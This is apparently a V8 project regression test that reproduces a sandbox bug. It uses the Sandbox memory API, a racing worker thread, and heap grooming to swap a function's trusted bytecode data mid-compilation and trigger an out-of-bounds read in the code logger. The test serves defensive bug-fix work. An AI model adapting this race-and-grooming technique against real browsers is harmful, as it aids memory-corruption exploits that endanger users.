// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing --allow-natives-syntax
// Flags: --log-code --log-source-position --logfile=+

// Test that V8FileLogger::LogSourceCodeInformation reads the trusted
// BytecodeArray (and SourcePositionTable) from the baseline Code object rather
// than re-reading SharedFunctionInfo::trusted_function_data from the sandbox.
// Swapping trusted_function_data during LogFunctionCompilation otherwise
// pairs a large SourcePositionTable with a tiny baseline bytecode_offset_table.

const memory = new Uint32Array(new Sandbox.MemoryView(0, 0x100000000));
const fieldOffset = (type, name) =>
    Sandbox.getFieldOffset(Sandbox.getInstanceTypeIdFor(type), name);

const kSfiOffset = fieldOffset('JS_FUNCTION_TYPE', 'shared_function_info');
const kTrustedDataOffset =
    fieldOffset('SHARED_FUNCTION_INFO_TYPE', 'trusted_function_data');
const kScriptOffset = fieldOffset('SHARED_FUNCTION_INFO_TYPE', 'script');
const kSourceOffset = fieldOffset('SCRIPT_TYPE', 'source');
// Script::line_ends sits at a fixed offset after Script::source.
const kLineEndsOffset = kSourceOffset + 20;

const line =
    'x=(x+a)+(x+b)+(x+c)+(x+d)+(x+e)+(x+f)+(x+g)+(x+h)+' +
    '(x+a)+(x+b)+(x+c)+(x+d)+(x+e)+(x+f)+(x+g)+(x+h);\n';
const largeFn = eval(
    `(function largeFn(x,a,b,c,d,e,f,g,h) {\n${line.repeat(4000)}\n` +
    `return x;\n})`);
largeFn(0, 1, 2, 3, 4, 5, 6, 7, 8);

const largeSfiAddr =
    memory[(Sandbox.getAddressOf(largeFn) + kSfiOffset) >>> 2] & ~1;
const largeTrustedData = memory[(largeSfiAddr + kTrustedDataOffset) >>> 2];

const sab = new SharedArrayBuffer(16);
const ctrl = new Int32Array(sab);
// ctrl[0]: stop flag (0 = run, 1 = stop)
// ctrl[1]: largeFn's BytecodeArray trusted handle
// ctrl[2]: word index of victim SFI's trusted_function_data (0 = idle)
// ctrl[3]: victim's original BytecodeArray trusted handle
Atomics.store(ctrl, 0, 0);
Atomics.store(ctrl, 1, largeTrustedData | 0);
Atomics.store(ctrl, 2, 0);
Atomics.store(ctrl, 3, 0);

// Wait until CompileSharedWithBaseline publishes the baseline Code handle, then
// overwrite trusted_function_data with largeFn's BytecodeArray while
// LogFunctionCompilation is recomputing Script::line_ends.
const worker = new Worker(function() {
  onmessage = function(e) {
    const ctrl = new Int32Array(e.data);
    const mem = new Uint32Array(new Sandbox.MemoryView(0, 0x100000000));
    const largeData = Atomics.load(ctrl, 1) >>> 0;
    postMessage('ready');
    while (Atomics.load(ctrl, 0) === 0) {
      const idx = Atomics.load(ctrl, 2) >>> 0;
      if (idx === 0) continue;
      const orig = Atomics.load(ctrl, 3) >>> 0;
      if ((mem[idx] >>> 0) !== orig) {
        mem[idx] = largeData;
        Atomics.store(ctrl, 2, 0);
      }
    }
  };
}, {type: 'function'});
worker.postMessage(sab);
if (worker.getMessage() !== 'ready') throw new Error('worker failed');

// Pad the script with newlines so clearing Script::line_ends widens the race
// window before V8FileLogger::LogSourceCodeInformation runs.
const newlinePad = '//\n' + '\n'.repeat(20000);
let tinySrc = '(function() { const fns = [];\n';
for (let i = 0; i < 8; i++) {
  tinySrc += `fns.push(function tiny${i}() { return ${i}; });\n`;
}
tinySrc += `return fns; })()\n${newlinePad}`;
const tinyFns = eval(tinySrc);
for (const fn of tinyFns) fn();

// Allocate enough TrustedByteArrays after tinyFns to push the next baseline
// bytecode_offset_table close to the top guard page of TrustedSpace.
const fillerBody = 'x = (x + 1) | 0; '.repeat(300);
for (let j = 0; j < 150; j++) {
  eval(`(function filler${j}(x) { ${fillerBody} return x; })`);
}

const firstSfi =
    memory[(Sandbox.getAddressOf(tinyFns[0]) + kSfiOffset) >>> 2] & ~1;
const scriptAddr = memory[(firstSfi + kScriptOffset) >>> 2] & ~1;

try {
  for (const fn of tinyFns) {
    const sfiAddr =
        memory[(Sandbox.getAddressOf(fn) + kSfiOffset) >>> 2] & ~1;
    const trustedDataIdx = (sfiAddr + kTrustedDataOffset) >>> 2;
    const origData = memory[trustedDataIdx] >>> 0;
    // Clear Script::line_ends so LogFunctionCompilation recomputes it.
    memory[(scriptAddr + kLineEndsOffset) >>> 2] = 0;
    Atomics.store(ctrl, 3, origData | 0);
    Atomics.store(ctrl, 2, trustedDataIdx | 0);
    %CompileBaseline(fn);
    Atomics.store(ctrl, 2, 0);
  }
} finally {
  Atomics.store(ctrl, 0, 1);
  worker.terminate();
}
